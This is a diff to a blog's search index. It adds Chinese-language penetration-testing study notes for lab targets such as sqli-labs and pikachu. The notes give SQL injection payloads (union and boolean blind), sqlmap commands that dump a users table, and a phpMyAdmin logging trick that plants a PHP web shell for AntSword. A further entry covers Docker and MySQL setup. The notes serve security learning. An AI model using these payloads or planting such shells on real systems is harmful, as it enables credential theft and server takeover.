@@ -4,6 +4,57 @@
   
     
     <entry>
+      <title>笔记9</title>
+      <link href="/2023/11/24/%E7%AC%94%E8%AE%B09/"/>
+      <url>/2023/11/24/%E7%AC%94%E8%AE%B09/</url>
+      
+        <content type="html"><![CDATA[<h3 id="Burp-suit"><a href="#Burp-suit" class="headerlink" title="Burp suit"></a>Burp suit</h3><p>字符型注入（GET）</p><p>抓包获取查询发送给重发器</p><h4 id="判断闭合条件"><a href="#判断闭合条件" class="headerlink" title="判断闭合条件"></a>判断闭合条件</h4><p>查询vince’（单引号）报错  查询vince”（双引号）没有报错可知使用‘单引号闭合</p><p>把vince’ and 1&#x3D;1–+  and 1&#x3D;1 返回正常，and 1&#x3D;2 查询不到用户</p><h4 id="查询字段数"><a href="#查询字段数" class="headerlink" title="查询字段数"></a>查询字段数</h4><p>order by 2–+ 查字段是否为2时，没有报错，查字段数是否为3时，报错。字段数为2</p><h4 id="查询回显位"><a href="#查询回显位" class="headerlink" title="查询回显位"></a>查询回显位</h4><p>union select 1,2–+ 显示结果 说明字段1和2都是回显位</p><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>简单的暴力破解</p><p>直接抓包，发送给 intruder</p><p>选择password  在有效荷载（简单列表）出添加猜测的密码（至少有一个正确的）点击开始攻击</p><h3 id="sql-labs-Less"><a href="#sql-labs-Less" class="headerlink" title="sql-labs&#x2F;Less-?"></a>sql-labs&#x2F;Less-?</h3><p>sql注入通关</p><p>打开Kali 进入管理员界面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://&quot; --batch --dbs</span><br><span class="line">sqlmap -u &quot;http://&quot; --batch -D &quot;security&quot; --tables</span><br><span class="line">sqlmap -u &quot;http://&quot; --batch -D &quot;security&quot; -T &quot;users&quot; --columns</span><br><span class="line">sqlmap -u &quot;http://&quot; --batch -D &quot;security&quot;  -T &quot;users&quot; -C &quot;id,password&quot; --dump(!!!不要对没授权的进行dump)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 4 --+</span><br><span class="line">判断有多少列</span><br><span class="line">union select 1,2,3 -- -</span><br><span class="line">判断数据显示点</span><br><span class="line">union select 1,user(),database() --+</span><br><span class="line">显示出登录用户和数据库名</span><br><span class="line">union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27; ),3 -- -</span><br><span class="line">查看数据库有哪些表</span><br><span class="line">union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = &#x27;security&#x27; and table_name=&#x27;users&#x27; ),3 -- -</span><br><span class="line">查看对应表有哪些列</span><br><span class="line">union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3 --+</span><br></pre></td></tr></table></figure><p>闯关</p><p>前4关使用 Union</p><p>第5关</p><p>Boolean 注入攻击</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">length(database())&gt;=1，判断当前数据库长度是否&gt;=1，正确输出1，错误输出0</span><br><span class="line">substr(database(),1,1)=&#x27;s&#x27;，判断当前数据库的第一个字母是否为s，正确输出1，错误输出0，substr的作用是截取长度（可以使用Burp suit 进行枚举查询）</span><br><span class="line">ord(substr(database(),1,1))=115，转ASCII码判断，正确输出1，错误输出0</span><br><span class="line">substr((select table_name from information_schema.tables where table_schema=&#x27;A&#x27; limit 0,1),1,1)=&#x27;e&#x27;，判断A库下面第一张表的第一个字母是否为e，正确输出1，错误输出0</span><br><span class="line">substr((select column_name from information_schema.tables where table_name=&#x27;B&#x27; limit 0,1),1,1)=&#x27;e&#x27;，判断B表下面的第一个字段的第一个字母是否为e，正确输出1，错误输出0</span><br><span class="line">substr((select C from A.B limit 0,1),1,1)=&#x27;e&#x27;，判断C字段下面的第一个值的第一个字母是否为e，正确输出1，错误输出0</span><br></pre></td></tr></table></figure><h4 id="sql注入的难点在于分析闭合问题"><a href="#sql注入的难点在于分析闭合问题" class="headerlink" title="sql注入的难点在于分析闭合问题"></a>sql注入的难点在于分析闭合问题</h4><p>?id&#x3D;1’<br>?id&#x3D;1”<br>1：如果都报错<br>判断闭合符为：数字闭合（不需要闭合）。</p><p>2：如果单引号报错，双引号不报错。</p><p>?id&#x3D;1’ ）<br>1：无报错<br>判断闭合符为：单引号闭合。<br>2：报错<br>判断闭合符可能为：单引号加括号。</p><p>?id&#x3D;1” ）<br>结果1：结果无报错<br>判断闭合符为：双引号闭合。<br>结果2：报错<br>判断闭合符可能为：双引号加括号。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 1 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>笔记8</title>
+      <link href="/2023/11/24/%E7%AC%94%E8%AE%B08/"/>
+      <url>/2023/11/24/%E7%AC%94%E8%AE%B08/</url>
+      
+        <content type="html"><![CDATA[<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p>mysql基础知识</p><p>注入点检测</p><p>页面返回正常</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=1--+</span><br><span class="line">or 1=2--+</span><br></pre></td></tr></table></figure><p>页面返回异常</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=2--+</span><br><span class="line">or 1=1--+</span><br></pre></td></tr></table></figure><p>判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数字型注入</span><br><span class="line">字符型注入</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST: POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中</span><br><span class="line">GET:提交方式是 GET , 注入点的位置在 GET 参数部分</span><br><span class="line">Cookie：HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中</span><br><span class="line"></span><br><span class="line">HTTP 头：注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中</span><br></pre></td></tr></table></figure><h3 id="靶机pikachu"><a href="#靶机pikachu" class="headerlink" title="靶机pikachu"></a>靶机pikachu</h3><p>将压缩包解压在C:\phpstudy_pro\WWW目录下</p><p>进入pikachu文件夹的inc目录，修改靶场配置文件config.inc.php，设置数据库账号密码均为root</p><p>将文件config.inc.php重命名为config.php</p><p>在浏览器中打开进行初始化</p><p>基本函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version()：查询数据库版本</span><br><span class="line">user()：查询数据库使用者</span><br><span class="line">database():数据库</span><br><span class="line">system_user():系统用户名</span><br><span class="line">session_user():连接数据库的用户名</span><br><span class="line">current_user():当前用户名</span><br><span class="line">load_file():读取本地文件</span><br><span class="line">@@datadir:读取数据库路径</span><br><span class="line">@@basedir:mysql安装</span><br><span class="line">@@version_complie_os:查看操作系统</span><br><span class="line">ascii(str):返回给定字符的ascii值，如果str是空字符串，返回0；如果str是NULL，返回NULL。</span><br><span class="line">如ascii(&quot;a&quot;)=97</span><br><span class="line">length(str):返回给定字符串的长度如 length(&quot;string&quot;)=6</span><br><span class="line">substr(string,start,length):对于给定字符串string，从start位开始截取，截取长度为length，</span><br><span class="line">如 substr(&quot;chinese&quot;,3,2)=&quot;in&quot;,也可以substr(string from start for length)</span><br><span class="line">substr()、strstring()、mid()三个函数的用法功能一致</span><br><span class="line">concat(username):将查询到的username连在一起，默认使用逗号分隔</span><br><span class="line">concat(str1,&#x27;*&#x27;,str2):将字符串str1和str2的数据查询到一起，中间用*连接</span><br><span class="line">group_concat(username)</span><br></pre></td></tr></table></figure><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>1：注入条件</p><p>1：用户可以控制数据的输入</p><p>2：运行的代码拼接了用户的输入并运行</p><p>2：注入攻击</p><p>Union注入</p><p>进行注入点判断</p><p>POST  ：id&#x3D;1’ and 1&#x3D;1–+ 显示正常存在注入点</p><p>order by 3  不存在   order by 2 有回显</p><p>union select 1,2–+ </p><p>union select 1,user();–+</p><h1 id="Burp-suit"><a href="#Burp-suit" class="headerlink" title="Burp suit"></a>Burp suit</h1><p>安装BP</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Target(目标)——显示目标目录结构的的一个功能</span><br><span class="line">Proxy(代理)——拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。</span><br><span class="line">Spider(蜘蛛)——应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。</span><br><span class="line">Scanner(扫描器)——高级工具，执行后，它能自动地发现web 应用程序的安全漏洞。</span><br><span class="line">Intruder(入侵)——一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。</span><br><span class="line">Repeater(中继器)——一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具。</span><br><span class="line">Sequencer(会话)——用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。</span><br><span class="line">Decoder(解码器)——进行手动执行或对应用程序数据者智能解码编码的工具。</span><br><span class="line">Comparer(对比)——通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。</span><br><span class="line">Extender(扩展)——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。</span><br><span class="line">Options(设置)——对Burp Suite的一些设置</span><br></pre></td></tr></table></figure><h3 id="GOOGLE-手动安装代理"><a href="#GOOGLE-手动安装代理" class="headerlink" title="GOOGLE 手动安装代理"></a>GOOGLE 手动安装代理</h3><p>安装拓展程序Proxy SwitchyOmega监听127.0.0.1 8080端口（本机）</p><p>截取请求</p><h3 id="burp-suit"><a href="#burp-suit" class="headerlink" title="burp suit"></a>burp suit</h3><p>点击代理选择127.0.0.1 8080</p><p>截断请求抓包获取信息发送给重发器</p><p>修改信息进行注入</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>笔记7</title>
+      <link href="/2023/11/22/%E7%AC%94%E8%AE%B07/"/>
+      <url>/2023/11/22/%E7%AC%94%E8%AE%B07/</url>
+      
+        <content type="html"><![CDATA[<h1 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h1><p>phpMyAdmin是众多 MySQL图形化管理工具中使用最为广泛的一种，是一款使用PHP 开发的基于B&#x2F;S模式的 MySQL 客户端软件，该工具是基于 Web 跨平台的管理程序。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;</span><br></pre></td></tr></table></figure><p>开启全局日志</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log=ON</span><br></pre></td></tr></table></figure><p>更改日志路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log_file=&quot;C:/phpstudy_pro/WWW/1.php&quot;</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;? phpinfo(); ?&gt;&#x27;</span><br></pre></td></tr></table></figure><p>测试结果</p><p><img src="https://cdn.jsdelivr.net/gh/elegege/images@main//imagePHP.jpg"></p><h1 id="安装蚁剑"><a href="#安装蚁剑" class="headerlink" title="安装蚁剑"></a>安装蚁剑</h1><p>执行语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php @eavl($_post[cmd]); ?&gt;&#x27;</span><br></pre></td></tr></table></figure><p>1：安装蚁剑</p><p><a href="https://github.com/AntSwordProject/AntSword-Loader">蚁剑加载器：</a></p><p><a href="https://github.com/AntSwordProject/antSword">核心源码：</a></p><p>（加载器中初始化不成功，GitHub上下载的核心源码）</p><p>2：使用蚁剑</p><p>右键空白处添加数据，输入地址和密码【cmd】</p><p>测试链接（连接成功）</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 1 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>笔记6</title>
       <link href="/2023/11/20/%E7%AC%94%E8%AE%B06/"/>
       <url>/2023/11/20/%E7%AC%94%E8%AE%B06/</url>
@@ -164,11 +215,11 @@
     
     
     <entry>
-      <title>haiboke</title>
+      <title>笔记5</title>
       <link href="/2023/11/07/haiboke/"/>
       <url>/2023/11/07/haiboke/</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<p>sudo yum install -y yum-utils device-mapper-persistent-data lvm2</p><p>sudo yum-config-manager –add-repo <a href="http://mirrors.ustc.edu.cn/docker-ce/linux/centos/docker-ce.repo">http://mirrors.ustc.edu.cn/docker-ce/linux/centos/docker-ce.repo</a></p><p>sudo yum-config-manager –add-repo <a href="http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo">http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</a></p><p>安装docker；出现输入的界面都按 y：sudo yum install -y docker-ce</p><p>执行如下命令： </p><p>mkdir &#x2F;etc&#x2F;docker<br>vi &#x2F;etc&#x2F;docker&#x2F;daemon.json</p><p>wangxiaoer 2023&#x2F;11&#x2F;21 10:25:59<br>在文件中加入下面内容 ：<br>{<br>“registry-mirrors”: [“<a href="https://docker.mirrors.ustc.edu.cn"]">https://docker.mirrors.ustc.edu.cn&quot;]</a><br>}<br>{<br> “registry-mirrors”:[“<a href="https://6kx4zyno.mirror.aliyuncs.com"]">https://6kx4zyno.mirror.aliyuncs.com&quot;]</a><br>}</p><p>docker run -id –name&#x3D;ydl_tomcat -p 8081:8080 -v &#x2F;root&#x2F;tomcat:&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps tomcat</p><p>sudo docker pull php:5.6-fpm</p><p>sudo docker pull mysql:5.7</p><p>sudo docker run –name mysql57 -v mysql57:&#x2F;var&#x2F;lib&#x2F;mysql -e MYSQL_ROOT_PASSWORD&#x3D;123456 -p 3306:3306 -d mysql:5.7</p><p>msyql -h 172.17.0.3 -uroot -p123456</p><p>sudo docker exec -it mysql57 bash<br>sudo docker exec -it mysql57 bash</p><p>sudo docker run –name phpmyadmin –link mysql57:db -p 9998:80 -d phpmyadmin&#x2F;phpmyadmin</p><p>192.168.5.110:9998</p><p><a href="192.168.5.110:9998">phpmyadmin</a></p><p><a href="https://so.csdn.net/so/search?q=phpMyAdmin&spm=1001.2101.3001.7020">phpMyAdmin</a> 是众多 MySQL图形化管理工具中使用最为广泛的一种，是一款使用PHP 开发的基于B&#x2F;S模式的 MySQL 客户端软件，该工具是基于 Web 跨平台的管理程序，并且支持简体中文，用户可以在官网上下载最新版本的。</p><p>phpMyAdmin 为Web 开发人员提供了类似 Access，SQL Server 的图形化数据库操作界面，通过该管理工具可以对 MySQL 进行各种操作，如何创建数据库，数据表和生成 MySQL 数据库脚本文件等</p>]]></content>
       
       
       
